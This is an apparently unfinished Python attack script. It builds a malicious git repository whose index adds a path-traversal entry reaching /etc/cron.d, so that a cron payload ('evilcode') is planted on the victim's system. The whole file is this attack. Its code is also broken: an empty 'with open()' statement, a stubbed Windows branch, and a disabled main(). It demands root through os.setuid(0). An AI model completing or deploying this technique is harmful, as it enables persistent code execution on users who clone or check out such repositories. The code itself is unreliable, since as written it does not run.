import sys

from icecream import ic
from git import Repo
import os

ic.configureOutput(prefix="")
####
# fu will output the func
# ic.configureOutput(prefix="")
# ic(fu(12))
# fu(12): 14
####
path = os.path.dirname(os.path.realpath(__file__))
superLongParentDirectory = "../"*20+".."

def badRepoGenerator( evilcode :str, outputDirName :str,
                      badfileName=".evilcodeExec",
                      fuckMethod="cron" ,os = "linux"):

    assert outputDirName not in [ "","/" ]

    path = "./"
    workingDirectory = path + outputDirName
    print("[+]Generate ",end = "")
    ic(workingDirectory)

    badRepo = Repo.init( path=workingDirectory,mkdir=True )

    if os == "linux":
        evilPayloadLocation = superLongParentDirectory+"/etc/cron.d/"+badfileName
        with open()
        badRepo.index.add([evilPayloadLocation])
        pass


    elif os == "win" :
        pass # not available now


def main():
    badRepoGenerator("echo 12","test")


def banner():
    pass

if __name__ == "__main__":
    banner()
    try:
        os.setuid(0)
    except PermissionError:
        print("[-] We need root privilege to generate payload")
        print("[*] Now privilege is :"+os.popen("whoami").read())
        exit(-1)
    # main()